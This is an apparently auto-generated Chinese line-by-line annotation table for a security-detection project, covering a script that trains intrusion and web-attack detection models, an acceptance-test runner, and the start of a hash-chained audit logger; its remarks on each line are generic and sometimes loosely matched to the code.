| 113 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 114 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 115 | 条件判断：满足条件时进入对应分支。 | `if __name__ == "__main__":` |
| 116 | 函数调用：执行已有函数/方法完成当前步骤。 | `    sys.exit(main())` |

## `scripts/train_all.py`

- 类型：运维/训练脚本
- 行数：175

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 2 | 代码语句：参与当前文件的业务流程或数据处理。 | `一键训练全部检测模型（Phase 8：首次部署引导）` |
| 3 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 4 | 代码语句：参与当前文件的业务流程或数据处理。 | `功能：` |
| 5 | 代码语句：参与当前文件的业务流程或数据处理。 | `    1. 检查数据集是否就位，缺失时提示并可选自动调用 download_datasets` |
| 6 | 代码语句：参与当前文件的业务流程或数据处理。 | `    2. 按 DDoS → Intrusion → WebAttack → Anomaly 顺序训练 4 个模型` |
| 7 | 代码语句：参与当前文件的业务流程或数据处理。 | `    3. 任一模型训练失败不会中断其他模型（\`--strict\` 可切换为失败即退出）` |
| 8 | 代码语句：参与当前文件的业务流程或数据处理。 | `    4. 训练完成后打印 \`models/saved/\` 目录清单` |
| 9 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 10 | 代码语句：参与当前文件的业务流程或数据处理。 | `使用：` |
| 11 | 代码语句：参与当前文件的业务流程或数据处理。 | `    python scripts/train_all.py                # 自动下载缺失数据集` |
| 12 | 代码语句：参与当前文件的业务流程或数据处理。 | `    python scripts/train_all.py --no-download  # 缺数据集直接跳过对应模型` |
| 13 | 代码语句：参与当前文件的业务流程或数据处理。 | `    python scripts/train_all.py --only web,anomaly` |
| 14 | 代码语句：参与当前文件的业务流程或数据处理。 | `    python scripts/train_all.py --strict` |
| 15 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 16 | 代码语句：参与当前文件的业务流程或数据处理。 | `注意：` |
| 17 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - NSL-KDD 数据集需联网下载（raw.githubusercontent.com）` |
| 18 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - WebAttack 训练只依赖内置样本，零外部数据即可跑通` |
| 19 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - Anomaly 训练使用仿真数据，零外部数据即可跑通` |
| 20 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 21 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 22 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 23 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import argparse` |
| 24 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import importlib` |
| 25 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import os` |
| 26 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import sys` |
| 27 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import time` |
| 28 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import traceback` |
| 29 | 导入对象：从指定模块引入类、函数或常量。 | `from typing import Callable, Dict, List, Tuple` |
| 30 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 31 | 注释：解释下面或当前这段代码的设计意图。 | `# 将项目根加入 sys.path（脚本可从任意目录调用）` |
| 32 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))` |
| 33 | 条件判断：满足条件时进入对应分支。 | `if ROOT not in sys.path:` |
| 34 | 函数调用：执行已有函数/方法完成当前步骤。 | `    sys.path.insert(0, ROOT)` |
| 35 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 36 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `DATASET_DIR = os.path.join(ROOT, "data", "datasets")` |
| 37 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `NSL_KDD_FILES = ("KDDTrain+.txt", "KDDTest+.txt")` |
| 38 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 39 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 40 | 函数定义：声明 `_nsl_kdd_ready` 的输入、处理逻辑和返回结果。 | `def _nsl_kdd_ready() -> bool:` |
| 41 | 文档字符串：说明当前模块、类或函数的职责。 | `    """判断 NSL-KDD 数据集是否已就位。"""` |
| 42 | 返回结果：把处理后的值交回调用方。 | `    return all(` |
| 43 | 函数调用：执行已有函数/方法完成当前步骤。 | `        os.path.exists(os.path.join(DATASET_DIR, f))` |
| 44 | 函数调用：执行已有函数/方法完成当前步骤。 | `        and os.path.getsize(os.path.join(DATASET_DIR, f)) > 0` |
| 45 | 循环：逐个处理集合或迭代器中的元素。 | `        for f in NSL_KDD_FILES` |
| 46 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 47 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 48 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 49 | 函数定义：声明 `_ensure_nsl_kdd` 的输入、处理逻辑和返回结果。 | `def _ensure_nsl_kdd(auto_download: bool) -> bool:` |
| 50 | 文档字符串：说明当前模块、类或函数的职责。 | `    """若缺失且允许自动下载则触发 download_datasets；返回是否就绪。"""` |
| 51 | 条件判断：满足条件时进入对应分支。 | `    if _nsl_kdd_ready():` |
| 52 | 返回结果：把处理后的值交回调用方。 | `        return True` |
| 53 | 条件判断：满足条件时进入对应分支。 | `    if not auto_download:` |
| 54 | 函数调用：执行已有函数/方法完成当前步骤。 | `        print("[train_all] NSL-KDD 数据集缺失，且 --no-download 生效，跳过相关模型")` |
| 55 | 返回结果：把处理后的值交回调用方。 | `        return False` |
| 56 | 函数调用：执行已有函数/方法完成当前步骤。 | `    print("[train_all] NSL-KDD 数据集缺失，开始下载...")` |
| 57 | 异常保护：尝试执行可能失败的逻辑。 | `    try:` |
| 58 | 导入对象：从指定模块引入类、函数或常量。 | `        from scripts.download_datasets import download_nsl_kdd  # noqa: WPS433` |
| 59 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        results = download_nsl_kdd()` |
| 60 | 条件判断：满足条件时进入对应分支。 | `        if not all(results.values()):` |
| 61 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            print(f"[train_all] 部分数据集下载失败: {results}")` |
| 62 | 异常处理：捕获错误并执行降级或记录逻辑。 | `    except Exception as exc:  # noqa: BLE001` |
| 63 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        print(f"[train_all] 数据集下载异常: {exc}")` |
| 64 | 返回结果：把处理后的值交回调用方。 | `    return _nsl_kdd_ready()` |
| 65 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 66 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 67 | 函数定义：声明 `_invoke` 的输入、处理逻辑和返回结果。 | `def _invoke(module_path: str, func_name: str) -> None:` |
| 68 | 文档字符串：说明当前模块、类或函数的职责。 | `    """动态导入模块并调用其入口函数。"""` |
| 69 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    mod = importlib.import_module(module_path)` |
| 70 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    fn: Callable[[], None] = getattr(mod, func_name)` |
| 71 | 函数调用：执行已有函数/方法完成当前步骤。 | `    fn()` |
| 72 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 73 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 74 | 注释：解释下面或当前这段代码的设计意图。 | `# (short_name, requires_nsl_kdd, human_name, invoke_tuple)` |
| 75 | 注释：解释下面或当前这段代码的设计意图。 | `# invoke_tuple: (module_path, function_name)` |
| 76 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `TRAINERS: List[Tuple[str, bool, str, Tuple[str, str]]] = [` |
| 77 | 函数调用：执行已有函数/方法完成当前步骤。 | `    ("ddos", True, "DDoS 检测（随机森林）", ("models.train.train_ddos", "train")),` |
| 78 | 函数调用：执行已有函数/方法完成当前步骤。 | `    ("intrusion", True, "入侵检测（CNN+LSTM / RF 备选）",` |
| 79 | 函数调用：执行已有函数/方法完成当前步骤。 | `        ("models.train.train_intrusion", "train_rf_fallback")),  # RF 备选更稳` |
| 80 | 函数调用：执行已有函数/方法完成当前步骤。 | `    ("web", False, "Web 攻击检测（TF-IDF + NB）",` |
| 81 | 函数调用：执行已有函数/方法完成当前步骤。 | `        ("models.train.train_web_attack", "train")),` |
| 82 | 函数调用：执行已有函数/方法完成当前步骤。 | `    ("anomaly", False, "异常检测（Isolation Forest + Autoencoder）",` |
| 83 | 函数调用：执行已有函数/方法完成当前步骤。 | `        ("models.train.train_anomaly", "train_isolation_forest")),` |
| 84 | 代码语句：参与当前文件的业务流程或数据处理。 | `]` |
| 85 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 86 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 87 | 函数定义：声明 `_parse_only` 的输入、处理逻辑和返回结果。 | `def _parse_only(value: str) -> List[str]:` |
| 88 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    parts = [p.strip().lower() for p in value.split(",") if p.strip()]` |
| 89 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    valid = {name for name, _, _, _ in TRAINERS}` |
| 90 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    invalid = [p for p in parts if p not in valid]` |
| 91 | 条件判断：满足条件时进入对应分支。 | `    if invalid:` |
| 92 | 抛出异常：主动报告不可继续的错误。 | `        raise SystemExit(f"--only 包含未知模型: {invalid}，支持项: {sorted(valid)}")` |
| 93 | 返回结果：把处理后的值交回调用方。 | `    return parts` |
| 94 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 95 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 96 | 函数定义：声明 `main` 的输入、处理逻辑和返回结果。 | `def main() -> int:` |
| 97 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    parser = argparse.ArgumentParser(description="一键训练 AI-Security-Guardian 全部检测模型")` |
| 98 | 函数调用：执行已有函数/方法完成当前步骤。 | `    parser.add_argument("--no-download", action="store_true",` |
| 99 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        help="缺少数据集时不自动下载")` |
| 100 | 函数调用：执行已有函数/方法完成当前步骤。 | `    parser.add_argument("--only", default="",` |
| 101 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        help="只训练指定模型，逗号分隔（ddos,intrusion,web,anomaly）")` |
| 102 | 函数调用：执行已有函数/方法完成当前步骤。 | `    parser.add_argument("--strict", action="store_true",` |
| 103 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        help="任一模型失败即退出")` |
| 104 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    args = parser.parse_args()` |
| 105 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 106 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    only_set = set(_parse_only(args.only)) if args.only else None` |
| 107 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 108 | 函数调用：执行已有函数/方法完成当前步骤。 | `    print("=" * 60)` |
| 109 | 函数调用：执行已有函数/方法完成当前步骤。 | `    print("AI-Security-Guardian 一键模型训练 (Phase 8)")` |
| 110 | 函数调用：执行已有函数/方法完成当前步骤。 | `    print("=" * 60)` |
| 111 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 112 | 注释：解释下面或当前这段代码的设计意图。 | `    # 准备数据集（仅在需要时）` |
| 113 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    need_nsl = any(` |
| 114 | 代码语句：参与当前文件的业务流程或数据处理。 | `        req_nsl for name, req_nsl, _, _ in TRAINERS` |
| 115 | 条件判断：满足条件时进入对应分支。 | `        if only_set is None or name in only_set` |
| 116 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 117 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    nsl_ok = _ensure_nsl_kdd(auto_download=not args.no_download) if need_nsl else True` |
| 118 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 119 | 注释：解释下面或当前这段代码的设计意图。 | `    # 确保模型输出目录存在` |
| 120 | 函数调用：执行已有函数/方法完成当前步骤。 | `    os.makedirs(os.path.join(ROOT, "models", "saved"), exist_ok=True)` |
| 121 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 122 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    results: Dict[str, Tuple[bool, float, str]] = {}` |
| 123 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 124 | 循环：逐个处理集合或迭代器中的元素。 | `    for short, requires_nsl, human, (module_path, func) in TRAINERS:` |
| 125 | 条件判断：满足条件时进入对应分支。 | `        if only_set is not None and short not in only_set:` |
| 126 | 继续循环：跳过本轮剩余逻辑。 | `            continue` |
| 127 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 128 | 条件判断：满足条件时进入对应分支。 | `        if requires_nsl and not nsl_ok:` |
| 129 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            print(f"\n--- [SKIP] {human}: 缺少 NSL-KDD ---")` |
| 130 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            results[short] = (False, 0.0, "数据集缺失")` |
| 131 | 继续循环：跳过本轮剩余逻辑。 | `            continue` |
| 132 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 133 | 函数调用：执行已有函数/方法完成当前步骤。 | `        print(f"\n--- [TRAIN] {human} ---")` |
| 134 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        start = time.time()` |
| 135 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 136 | 函数调用：执行已有函数/方法完成当前步骤。 | `            _invoke(module_path, func)` |
| 137 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            elapsed = time.time() - start` |
| 138 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            results[short] = (True, elapsed, "ok")` |
| 139 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            print(f"--- [DONE ] {human}: 耗时 {elapsed:.1f}s ---")` |
| 140 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except Exception as exc:  # noqa: BLE001` |
| 141 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            elapsed = time.time() - start` |
| 142 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            print(f"--- [FAIL ] {human}: {exc} ---")` |
| 143 | 函数调用：执行已有函数/方法完成当前步骤。 | `            traceback.print_exc()` |
| 144 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            results[short] = (False, elapsed, str(exc))` |
| 145 | 条件判断：满足条件时进入对应分支。 | `            if args.strict:` |
| 146 | 函数调用：执行已有函数/方法完成当前步骤。 | `                print("\n[train_all] --strict 生效，停止后续训练")` |
| 147 | 跳出循环：提前结束当前循环。 | `                break` |
| 148 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 149 | 函数调用：执行已有函数/方法完成当前步骤。 | `    print("\n" + "=" * 60)` |
| 150 | 函数调用：执行已有函数/方法完成当前步骤。 | `    print("训练汇总：")` |
| 151 | 循环：逐个处理集合或迭代器中的元素。 | `    for name, (ok, elapsed, msg) in results.items():` |
| 152 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        flag = "OK  " if ok else "FAIL"` |
| 153 | 函数调用：执行已有函数/方法完成当前步骤。 | `        print(f"  [{flag}] {name:10s}  耗时 {elapsed:6.1f}s  {msg}")` |
| 154 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 155 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    saved_dir = os.path.join(ROOT, "models", "saved")` |
| 156 | 函数调用：执行已有函数/方法完成当前步骤。 | `    print(f"\nmodels/saved/ 目录内容：")` |
| 157 | 条件判断：满足条件时进入对应分支。 | `    if os.path.isdir(saved_dir):` |
| 158 | 循环：逐个处理集合或迭代器中的元素。 | `        for entry in sorted(os.listdir(saved_dir)):` |
| 159 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            full = os.path.join(saved_dir, entry)` |
| 160 | 条件判断：满足条件时进入对应分支。 | `            if os.path.isfile(full):` |
| 161 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                size = os.path.getsize(full)` |
| 162 | 函数调用：执行已有函数/方法完成当前步骤。 | `                print(f"  - {entry}  ({size} bytes)")` |
| 163 | 兜底分支：处理前面条件都不满足的情况。 | `            else:` |
| 164 | 函数调用：执行已有函数/方法完成当前步骤。 | `                print(f"  - {entry}/  (目录)")` |
| 165 | 兜底分支：处理前面条件都不满足的情况。 | `    else:` |
| 166 | 函数调用：执行已有函数/方法完成当前步骤。 | `        print("  (目录不存在)")` |
| 167 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 168 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ok_count = sum(1 for ok, _, _ in results.values() if ok)` |
| 169 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    total = len(results)` |
| 170 | 函数调用：执行已有函数/方法完成当前步骤。 | `    print(f"\n成功 {ok_count} / {total} 个模型。")` |
| 171 | 返回结果：把处理后的值交回调用方。 | `    return 0 if ok_count == total else (2 if args.strict else 0)` |
| 172 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 173 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 174 | 条件判断：满足条件时进入对应分支。 | `if __name__ == "__main__":` |
| 175 | 函数调用：执行已有函数/方法完成当前步骤。 | `    sys.exit(main())` |

## `scripts/verify_v1.py`

- 类型：运维/训练脚本
- 行数：26

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 注释：解释下面或当前这段代码的设计意图。 | `#!/usr/bin/env python3` |
| 2 | 文档字符串：说明当前模块、类或函数的职责。 | `"""v1.0 端到端验收脚本（不含需 Flask DB 的场景 10）。` |
| 3 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 4 | 代码语句：参与当前文件的业务流程或数据处理。 | `用法（在项目根目录 ai-security-guardian）::` |
| 5 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 6 | 代码语句：参与当前文件的业务流程或数据处理。 | `    python scripts/verify_v1.py` |
| 7 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    echo ExitCode: %ERRORLEVEL%` |
| 8 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 9 | 代码语句：参与当前文件的业务流程或数据处理。 | `场景 10 请运行::` |
| 10 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 11 | 代码语句：参与当前文件的业务流程或数据处理。 | `    python -m pytest tests/e2e/test_v1_acceptance.py::test_10_web_restart_alerts -q` |
| 12 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 13 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 14 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 15 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import sys` |
| 16 | 导入对象：从指定模块引入类、函数或常量。 | `from pathlib import Path` |
| 17 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 18 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `ROOT = Path(__file__).resolve().parent.parent` |
| 19 | 条件判断：满足条件时进入对应分支。 | `if str(ROOT) not in sys.path:` |
| 20 | 函数调用：执行已有函数/方法完成当前步骤。 | `    sys.path.insert(0, str(ROOT))` |
| 21 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 22 | 导入对象：从指定模块引入类、函数或常量。 | `from tests.e2e.verify_scenarios import main as run_verify_main` |
| 23 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 24 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 25 | 条件判断：满足条件时进入对应分支。 | `if __name__ == "__main__":` |
| 26 | 抛出异常：主动报告不可继续的错误。 | `    raise SystemExit(run_verify_main())` |

## `src/__init__.py`

- 类型：其他
- 行数：1

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 代码语句：参与当前文件的业务流程或数据处理。 | `﻿"""Package initializer."""` |

## `src/audit/__init__.py`

- 类型：审计日志
- 行数：1

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 代码语句：参与当前文件的业务流程或数据处理。 | `﻿"""Package initializer."""` |

## `src/audit/security_logger.py`

- 类型：审计日志
- 行数：365

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 2 | 代码语句：参与当前文件的业务流程或数据处理。 | `安全审计日志模块（Phase 6：安全审计层 + Phase 8：集成降级）` |
| 3 | 代码语句：参与当前文件的业务流程或数据处理。 | `对应架构文档 §7.2 安全日志 + §11.6 日志防篡改` |
| 4 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 5 | 代码语句：参与当前文件的业务流程或数据处理。 | `本模块负责：` |
| 6 | 代码语句：参与当前文件的业务流程或数据处理。 | `    1. 结构化安全事件日志 / 响应日志的写入（JSON Lines 格式）` |
| 7 | 代码语句：参与当前文件的业务流程或数据处理。 | `    2. 基于 SHA-256 哈希链的防篡改完整性校验` |
| 8 | 代码语句：参与当前文件的业务流程或数据处理。 | `    3. 数据库 / 磁盘异常时的本地缓冲降级（Phase 8 要求）` |
| 9 | 代码语句：参与当前文件的业务流程或数据处理。 | `    4. 完整性校验 API，供审计页面或运维巡检调用` |
| 10 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 11 | 代码语句：参与当前文件的业务流程或数据处理。 | `设计约定（避免与 Phase 7 及后续 Phase 8 集成冲突）：` |
| 12 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - 文件名固定 \`logs/security.log\`，每行一条独立 JSON` |
| 13 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - 所有日志都写入一个独立的 \`security\` logger（与 Flask 根 logger 分离）` |
| 14 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - 哈希链使用 \`prev_hash:canonical_json\` 方式累积，genesis 记为 'genesis'` |
| 15 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - 关闭完整性校验后不会写 integrity 字段（向后兼容）` |
| 16 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - 写入失败时会写入本地 \`logs/security_buffer.log\` 作为兜底，避免丢失` |
| 17 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 18 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 19 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 20 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import hashlib` |
| 21 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import json` |
| 22 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import logging` |
| 23 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import os` |
| 24 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import threading` |
| 25 | 导入对象：从指定模块引入类、函数或常量。 | `from datetime import datetime` |
| 26 | 导入对象：从指定模块引入类、函数或常量。 | `from typing import Any, Dict, Iterable, List, Optional` |
| 27 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 28 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 29 | 类定义：声明 `SecurityLogger`，封装相关状态与行为。 | `class SecurityLogger:` |
| 30 | 文档字符串：说明当前模块、类或函数的职责。 | `    """结构化安全日志记录器（带完整性保护 + 本地缓冲降级）。` |
| 31 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 32 | 代码语句：参与当前文件的业务流程或数据处理。 | `    Attributes:` |
| 33 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        log_dir: 日志输出目录。` |
| 34 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        enable_integrity: 是否启用哈希链完整性校验。` |
| 35 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        log_file: 主日志文件（\`logs/security.log\`）。` |
| 36 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        buffer_file: 写入失败时的兜底缓冲文件（\`logs/security_buffer.log\`）。` |
| 37 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 38 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 39 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    _LOG_FILENAME: str = "security.log"` |
| 40 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    _BUFFER_FILENAME: str = "security_buffer.log"` |
| 41 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 42 | 函数定义：声明 `__init__` 的输入、处理逻辑和返回结果。 | `    def __init__(` |
| 43 | 代码语句：参与当前文件的业务流程或数据处理。 | `        self,` |
| 44 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        log_dir: str = "logs",` |
| 45 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        enable_integrity: bool = True,` |
| 46 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> None:` |
| 47 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.log_dir = log_dir` |
| 48 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.enable_integrity = enable_integrity` |
| 49 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 50 | 函数调用：执行已有函数/方法完成当前步骤。 | `            os.makedirs(log_dir, exist_ok=True)` |
| 51 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except OSError as exc:` |
| 52 | 注释：解释下面或当前这段代码的设计意图。 | `            # 目录创建失败（极端情况）也不应拖垮主流程` |
| 53 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logging.getLogger(__name__).error(` |
| 54 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "[SecurityLogger] 日志目录创建失败，将退化为 stdout: %s", exc` |
| 55 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 56 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 57 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.log_file: str = os.path.join(log_dir, self._LOG_FILENAME)` |
| 58 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.buffer_file: str = os.path.join(log_dir, self._BUFFER_FILENAME)` |
| 59 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 60 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._lock = threading.Lock()` |
| 61 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._last_hash: str = ""` |
| 62 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 63 | 函数调用：执行已有函数/方法完成当前步骤。 | `        self._setup_logger()` |
| 64 | 注释：解释下面或当前这段代码的设计意图。 | `        # 进程重启后从已有日志恢复链尾，避免 prev_hash 重新回到 genesis` |
| 65 | 函数调用：执行已有函数/方法完成当前步骤。 | `        self._restore_last_hash()` |
| 66 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 67 | 注释：解释下面或当前这段代码的设计意图。 | `    # ------------------------------------------------------------------` |
| 68 | 注释：解释下面或当前这段代码的设计意图。 | `    # logger 初始化` |
| 69 | 注释：解释下面或当前这段代码的设计意图。 | `    # ------------------------------------------------------------------` |
| 70 | 函数定义：声明 `_setup_logger` 的输入、处理逻辑和返回结果。 | `    def _setup_logger(self) -> None:` |
| 71 | 文档字符串：说明当前模块、类或函数的职责。 | `        """配置独立的 \`security\` logger，文件 + 控制台双输出。"""` |
| 72 | 日志记录：输出运行状态、调试信息或异常线索。 | `        self.logger = logging.getLogger("security")` |
| 73 | 日志记录：输出运行状态、调试信息或异常线索。 | `        self.logger.setLevel(logging.INFO)` |
| 74 | 注释：解释下面或当前这段代码的设计意图。 | `        # 防止重复挂载 handler（多次实例化时）` |
| 75 | 条件判断：满足条件时进入对应分支。 | `        if not self.logger.handlers:` |
| 76 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 77 | 日志记录：输出运行状态、调试信息或异常线索。 | `                file_handler = logging.FileHandler(` |
| 78 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    self.log_file, encoding="utf-8"` |
| 79 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 80 | 日志记录：输出运行状态、调试信息或异常线索。 | `                file_handler.setFormatter(logging.Formatter("%(message)s"))` |
